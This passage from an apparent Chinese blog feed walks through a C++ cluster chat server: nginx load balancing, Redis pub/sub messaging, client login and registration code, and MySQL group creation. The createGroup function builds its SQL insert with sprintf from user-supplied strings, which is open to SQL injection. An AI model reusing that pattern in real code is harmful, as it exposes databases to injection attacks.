负载均衡配置</span></span><br><span class="line">stream&#123;</span><br><span class="line">        # 相当于是有2台服务器，weight=1表示大家都是公平选取，max_fails表示和主服务器进行3次心跳，</span><br><span class="line">        # 如果30s内没有响应，则心跳失败一次，连续3次失败，就说明该次服务器断了</span><br><span class="line">        upstream MyServer&#123;</span><br><span class="line">                server 127.0.0.1:6000 weight=1 max_fails=3 fail_timeout=30s;</span><br><span class="line">                server 127.0.0.1:6002 weight=1 max_fails=3 fail_timeout=30s;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        server &#123;</span><br><span class="line">                proxy_connect_timeout 1s;</span><br><span class="line">                # 表示所有客户端都去连接8000端口，然后再去分发到其他服务器上</span><br><span class="line">                listen 8000;</span><br><span class="line">                # 就是一个名字，连到哪个服务器</span><br><span class="line">                proxy_pass MyServer;</span><br><span class="line">                tcp_nodelay on;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h1><p>首先每个用户登录的时候，都会向<code>redis</code>订阅一个消息，命令为<code>SUBSCRIBE runoobChat</code>，我们将<code>runoobChat</code>设置为用户的<code>userid</code>，到时候当有消息到来的时候，<code>redis</code>就会向<code>userid</code>对应的<code>TcpConnectionPtr</code>发送消息。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// id用户登录成功后，向redis订阅channel(id)</span></span><br><span class="line">_redis.<span class="built_in">subscribe</span>(id);</span><br><span class="line">            </span><br><span class="line"><span class="comment">// 向redis指定的通道subscribe订阅消息</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Redis::subscribe</span><span class="params">(<span class="type">int</span> channel)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// SUBSCRIBE命令本身会造成线程阻塞等待通道里面发生消息，这里只做订阅通道，不接收通道消息</span></span><br><span class="line">    <span class="comment">// 通道消息的接收专门在observer_channel_message函数中的独立线程中进行</span></span><br><span class="line">    <span class="comment">// 只负责发送命令，不阻塞接收redis server响应消息，否则和notifyMsg线程抢占响应资源</span></span><br><span class="line">    <span class="keyword">if</span> (REDIS_ERR == <span class="built_in">redisAppendCommand</span>(<span class="keyword">this</span>-&gt;_subcribe_context, <span class="string">&quot;SUBSCRIBE %d&quot;</span>, channel))</span><br><span class="line">    &#123;</span><br><span class="line">        cerr &lt;&lt; <span class="string">&quot;subscribe command failed!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// redisBufferWrite可以循环发送缓冲区，直到缓冲区数据发送完毕（done被置为1）</span></span><br><span class="line">    <span class="type">int</span> done = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!done)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (REDIS_ERR == <span class="built_in">redisBufferWrite</span>(<span class="keyword">this</span>-&gt;_subcribe_context, &amp;done))</span><br><span class="line">        &#123;</span><br><span class="line">            cerr &lt;&lt; <span class="string">&quot;subscribe command failed!&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// redisGetReply</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当<code>redis</code>收到消息后，会自动去调用注册的回调函数向该通道发送消息</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 连接redis服务器</span></span><br><span class="line"><span class="keyword">if</span> (_redis.<span class="built_in">connect</span>())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 设置上报消息的回调,redis发现某个通道有消息，就会自动向该通道发送消息</span></span><br><span class="line">    _redis.<span class="built_in">init_notify_handler</span>(std::<span class="built_in">bind</span>(&amp;ChatService::handleRedisSubscribeMessage, <span class="keyword">this</span>, _1, _2));</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 从redis消息队列中获取订阅的消息</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ChatService::handleRedisSubscribeMessage</span><span class="params">(<span class="type">int</span> userid, string msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="function">lock_guard&lt;mutex&gt; <span class="title">lock</span><span class="params">(_connMutex)</span></span>;</span><br><span class="line">    <span class="keyword">auto</span> it = _userConnMap.<span class="built_in">find</span>(userid);</span><br><span class="line">    <span class="keyword">if</span> (it != _userConnMap.<span class="built_in">end</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        it-&gt;second-&gt;<span class="built_in">send</span>(msg);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 存储该用户的离线消息</span></span><br><span class="line">    _offlinemodel.<span class="built_in">insert</span>(userid, msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在独立线程中接收订阅通道中的消息</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Redis::observer_channel_message</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    redisReply *reply = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">while</span> (REDIS_OK == <span class="built_in">redisGetReply</span>(<span class="keyword">this</span>-&gt;_subcribe_context, (<span class="type">void</span> **)&amp;reply))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 订阅收到的消息是一个带三元素的数组 element[1]为通道号（也就是userid），element[2]是接收到的消息,element[0]是一个标志</span></span><br><span class="line">        <span class="keyword">if</span> (reply != <span class="literal">nullptr</span> &amp;&amp; reply-&gt;element[<span class="number">2</span>] != <span class="literal">nullptr</span> &amp;&amp; reply-&gt;element[<span class="number">2</span>]-&gt;str != <span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 给业务层上报通道上发生的消息</span></span><br><span class="line">            _notify_message_handler(<span class="built_in">atoi</span>(reply-&gt;element[<span class="number">1</span>]-&gt;str) , reply-&gt;element[<span class="number">2</span>]-&gt;str);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">freeReplyObject</span>(reply);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cerr &lt;&lt; <span class="string">&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; observer_channel_message quit &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Redis::init_notify_handler</span><span class="params">(function&lt;<span class="type">void</span>(<span class="type">int</span>,string)&gt; fn)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;_notify_message_handler = fn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意<code>redis</code>的订阅消息之后，该线程会一直阻塞，但是发布消息不会引起线程阻塞，所以在这里，对于发布和订阅，我使用了2个不同的线程</p></blockquote><p>至此基本的实现思路以及对应的主要代码已经实现，后续我会将全部功能进行测试，然后上传至<a href="https://github.com/shilinlun/ChatServer">Github</a>，希望通过这个项目来增进对后台服务器聊天项目的逻辑与业务有一个基本的认识，同时对项目对应的<code>muduo</code>有了基本认识，后续我会继续做一个<code>muduo</code>的基本源码解读与实现，也会挨着写成博客。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;对于前面单台服务器而言，几千的客户端压力基本没有什么影响，但当客户端达到上万的时候，就可能会遇到一些问题，因此我准备采用&lt;code&gt;nginx+redis&lt;/code&gt;的方式进行负载均衡，主要思路如下：&lt;/p&gt;</summary>
    
    
    
    <category term="集群聊天服务器" scheme="http://www.shicoder.top/categories/%E9%9B%86%E7%BE%A4%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>集群聊天服务器五</title>
    <link href="http://www.shicoder.top/posts/2548392652.html"/>
    <id>http://www.shicoder.top/posts/2548392652.html</id>
    <published>2022-04-21T02:54:23.000Z</published>
    <updated>2022-04-26T09:16:36.703Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>本章主要实现客户端的需求</p><span id="more"></span><p>客户端主要的流程为：<br>客户端分 2 个线程，一个<code>main</code>线程，一个子线程，主线程主要负责接受用户的数据并传输给服务器以及从服务器接受数据，子线程主要是接受其他人聊天的数据。通过一个<code>switch</code>来接受用户的输入：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 显示首页面菜单 登录、注册、退出</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;========================&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;1. login&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;2. register&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;3. quit&quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;========================&quot;</span> &lt;&lt; endl;</span><br></pre></td></tr></table></figure><h1 id="login"><a href="#login" class="headerlink" title="login"></a>login</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> id = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> pwd[<span class="number">50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;userid:&quot;</span>;</span><br><span class="line">cin &gt;&gt; id;</span><br><span class="line">cin.<span class="built_in">get</span>(); <span class="comment">// 读掉缓冲区残留的回车</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;userpassword:&quot;</span>;</span><br><span class="line">cin.<span class="built_in">getline</span>(pwd, <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">json js;</span><br><span class="line">js[<span class="string">&quot;msgid&quot;</span>] = LOGIN_MSG;</span><br><span class="line">js[<span class="string">&quot;id&quot;</span>] = id;</span><br><span class="line">js[<span class="string">&quot;password&quot;</span>] = pwd;</span><br><span class="line">string request = js.<span class="built_in">dump</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> len = <span class="built_in">send</span>(clientfd, request.<span class="built_in">c_str</span>(), <span class="built_in">strlen</span>(request.<span class="built_in">c_str</span>()) + <span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>服务器通过接受到的<code>request</code>来判断是否登录成功，若登录成功进入主界面</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 进入聊天主菜单页面</span></span><br><span class="line">isMainMenuRunning = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">mainMenu</span>(clientfd);</span><br></pre></td></tr></table></figure><p>在进入聊天页面之前，客户端会获取当前用户的好友列表，群组列表，以及是否有离线消息，然后当用户登录时候会自动显示，其代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 显示当前登录成功用户的基本信息</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">showCurrentUserData</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;======================login user======================&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;current login user =&gt; id:&quot;</span> &lt;&lt; g_currentUser.<span class="built_in">getId</span>() &lt;&lt; <span class="string">&quot; name:&quot;</span> &lt;&lt; g_currentUser.<span class="built_in">getName</span>() &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;----------------------friend list---------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">if</span> (!g_currentUserFriendList.<span class="built_in">empty</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (User &amp;user : g_currentUserFriendList)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; user.<span class="built_in">getId</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; user.<span class="built_in">getName</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; user.<span class="built_in">getState</span>() &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;----------------------group list----------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">if</span> (!g_currentUserGroupList.<span class="built_in">empty</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (Group &amp;group : g_currentUserGroupList)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; group.<span class="built_in">getId</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; group.<span class="built_in">getName</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; group.<span class="built_in">getDesc</span>() &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">for</span> (GroupUser &amp;user : group.<span class="built_in">getUsers</span>())</span><br><span class="line">            &#123;</span><br><span class="line">                cout &lt;&lt; user.<span class="built_in">getId</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; user.<span class="built_in">getName</span>() &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; user.<span class="built_in">getState</span>()</span><br><span class="line">                     &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; user.<span class="built_in">getRole</span>() &lt;&lt; endl;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;======================================================&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后进入聊天主页面程序，其中聊天主页面程序使用一个<code>unordered_map</code>来保存用户输入信息和对应的<code>function</code>,代码如下，当用户输入字符串时候，自动调用对应的函数，实现不同的功能，每个功能的实现在此不再详细说明，基本可以按照前面服务器编写的过程来编写对应的客户端程序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册系统支持的客户端命令处理</span></span><br><span class="line">unordered_map&lt;string, function&lt;<span class="type">void</span>(<span class="type">int</span>, string)&gt;&gt; commandHandlerMap = &#123;</span><br><span class="line">    &#123;<span class="string">&quot;help&quot;</span>, help&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;chat&quot;</span>, chat&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;addfriend&quot;</span>, addfriend&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;creategroup&quot;</span>, creategroup&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;addgroup&quot;</span>, addgroup&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;groupchat&quot;</span>, groupchat&#125;,</span><br><span class="line">    &#123;<span class="string">&quot;loginout&quot;</span>, loginout&#125;&#125;;</span><br></pre></td></tr></table></figure><h1 id="register"><a href="#register" class="headerlink" title="register"></a>register</h1><p>和登录一样，用户按照规定格式进行输入，然后利用<code>json</code>进行解析</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> name[<span class="number">50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">char</span> pwd[<span class="number">50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;username:&quot;</span>;</span><br><span class="line">cin.<span class="built_in">getline</span>(name, <span class="number">50</span>); <span class="comment">// 没有用cin&gt;&gt; 因为这样遇到空格就会终止，比如输入zhang san，就只会得到zhang</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;userpassword:&quot;</span>;</span><br><span class="line">cin.<span class="built_in">getline</span>(pwd, <span class="number">50</span>);</span><br><span class="line"></span><br><span class="line">json js;</span><br><span class="line">js[<span class="string">&quot;msgid&quot;</span>] = REG_MSG;</span><br><span class="line">js[<span class="string">&quot;name&quot;</span>] = name;</span><br><span class="line">js[<span class="string">&quot;password&quot;</span>] = pwd;</span><br><span class="line">string request = js.<span class="built_in">dump</span>();</span><br></pre></td></tr></table></figure><h1 id="子线程"><a href="#子线程" class="headerlink" title="子线程"></a>子线程</h1><p>子线程主要用于接受聊天内容，其主要代码为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 接收线程</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">readTaskHandler</span><span class="params">(<span class="type">int</span> clientfd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> buffer[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> len = <span class="built_in">recv</span>(clientfd, buffer, <span class="number">1024</span>, <span class="number">0</span>);  <span class="comment">// 阻塞了</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">-1</span> == len || <span class="number">0</span> == len)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">close</span>(clientfd);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 接收ChatServer转发的数据，反序列化生成json数据对象</span></span><br><span class="line">        json js = json::<span class="built_in">parse</span>(buffer);</span><br><span class="line">        <span class="type">int</span> msgtype = js[<span class="string">&quot;msgid&quot;</span>].<span class="built_in">get</span>&lt;<span class="type">int</span>&gt;();</span><br><span class="line">        <span class="keyword">if</span> (ONE_CHAT_MSG == msgtype)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; js[<span class="string">&quot;time&quot;</span>].<span class="built_in">get</span>&lt;string&gt;() &lt;&lt; <span class="string">&quot; [&quot;</span> &lt;&lt; js[<span class="string">&quot;id&quot;</span>] &lt;&lt; <span class="string">&quot;]&quot;</span> &lt;&lt; js[<span class="string">&quot;name&quot;</span>].<span class="built_in">get</span>&lt;string&gt;()</span><br><span class="line">                 &lt;&lt; <span class="string">&quot; said: &quot;</span> &lt;&lt; js[<span class="string">&quot;msg&quot;</span>].<span class="built_in">get</span>&lt;string&gt;() &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (GROUP_CHAT_MSG == msgtype)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;群消息[&quot;</span> &lt;&lt; js[<span class="string">&quot;groupid&quot;</span>] &lt;&lt; <span class="string">&quot;]:&quot;</span> &lt;&lt; js[<span class="string">&quot;time&quot;</span>].<span class="built_in">get</span>&lt;string&gt;() &lt;&lt; <span class="string">&quot; [&quot;</span> &lt;&lt; js[<span class="string">&quot;id&quot;</span>] &lt;&lt; <span class="string">&quot;]&quot;</span> &lt;&lt; js[<span class="string">&quot;name&quot;</span>].<span class="built_in">get</span>&lt;string&gt;()</span><br><span class="line">                 &lt;&lt; <span class="string">&quot; said: &quot;</span> &lt;&lt; js[<span class="string">&quot;msg&quot;</span>].<span class="built_in">get</span>&lt;string&gt;() &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本项目可以利用不同的消息<code>id</code>来识别不同的聊天信息（一对一还是群组聊天），至此基本的客户端和服务端基本完成搭建，可以直接运行，后面主要利用<code>redis</code>和<code>nginx</code>来扩充该项目</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;博客网址：&lt;a href=&quot;http://www.shicoder.top/&quot;&gt;www.shicoder.top&lt;/a&gt;&lt;br&gt;微信：18223081347&lt;br&gt;欢迎加群聊天 ：452380935&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;本章主要实现客户端的需求&lt;/p&gt;</summary>
    
    
    
    <category term="集群聊天服务器" scheme="http://www.shicoder.top/categories/%E9%9B%86%E7%BE%A4%E8%81%8A%E5%A4%A9%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
    
    <category term="导航" scheme="http://www.shicoder.top/tags/%E5%AF%BC%E8%88%AA/"/>
    
    <category term="分享" scheme="http://www.shicoder.top/tags/%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>集群聊天服务器四</title>
    <link href="http://www.shicoder.top/posts/2315714697.html"/>
    <id>http://www.shicoder.top/posts/2315714697.html</id>
    <published>2022-04-21T02:51:12.000Z</published>
    <updated>2022-04-26T09:16:23.463Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>博客网址：<a href="http://www.shicoder.top/">www.shicoder.top</a><br>微信：18223081347<br>欢迎加群聊天 ：452380935</p></blockquote><p>本章我们实现群组创建、添加群组、群组聊天等功能，首先我们先看下和群组相关的表结构</p><span id="more"></span><p><strong>allgroup表</strong></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/88f7631a50814de3aebf6ae470267157~tplv-k3u1fbpfcp-zoom-1.image"><br><strong>groupuser表</strong></p><p><img src="https://p3-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/6da8ef3eb5d8490e8e1cbccac1812f20~tplv-k3u1fbpfcp-zoom-1.image"></p><h1 id="群组创建"><a href="#群组创建" class="headerlink" title="群组创建"></a>群组创建</h1><p>首先代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建群组</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">GroupModel::createGroup</span><span class="params">(Group &amp;group)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 组装sql语句</span></span><br><span class="line">    <span class="type">char</span> sql[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">sprintf</span>(sql, <span class="string">&quot;insert into allgroup(groupname,groupdesc) values(&#x27;%s&#x27;,&#x27;%s&#x27;)&quot;</span>, group.<span class="built_in">getName</span>().<span class="built_in">c_str</span>(), group.<span class="built_in">getDesc</span>().<span class="built_in">c_str</span>());</span><br><span class="line">    MySQL mysql;</span><br><span class="line">    <span class="keyword">if</span> (mysql.<span class="built_in">connect</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (mysql.<span class="built_in">update</span>(sql))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 主键id是自增的</span></span><br><span class="line">            group.<span class="built_in">setId</span>(<span class="built_in">mysql_insert_id</span>(mysql.<span class="built_in">getConnection</span>()));</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提供一个<code>Group</code>对象，然后通过对象进行创建群组，根据<code>Group</code>表的设计，<code>Group</code>对象的结构如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Group</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Group</span>(<span class="type">int</span> id = <span class="number">-1</span>, string name = <span class="string">&quot;&quot;</span>, string desc = <span 